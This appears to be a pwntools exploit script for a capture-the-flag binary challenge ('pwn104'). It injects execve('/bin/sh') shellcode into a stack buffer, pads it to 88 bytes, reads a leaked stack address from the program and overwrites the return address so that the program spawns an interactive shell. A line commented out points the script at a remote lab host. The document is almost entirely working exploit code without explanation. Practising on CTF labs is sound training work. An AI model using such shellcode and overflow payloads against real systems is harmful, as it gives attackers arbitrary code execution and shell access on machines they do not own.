#!/usr/bin/env python3
from pwn import *

p = process('./pwn104.pwn104')
#p = remote('10.10.83.114', 9004)
sellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = sellcode
payload += b'A' * ( 88 - len(sellcode))
print(payload)
p.recvuntil(b'you at ')
address_leak = p.recvline()
address = int(address_leak.strip(b'\n'), 16)
print(f"Address: 0x{address:x}")
payload += p64(address)
#payload += p64(address) 
print(payload)
p.sendline(payload)

p.interactive() 
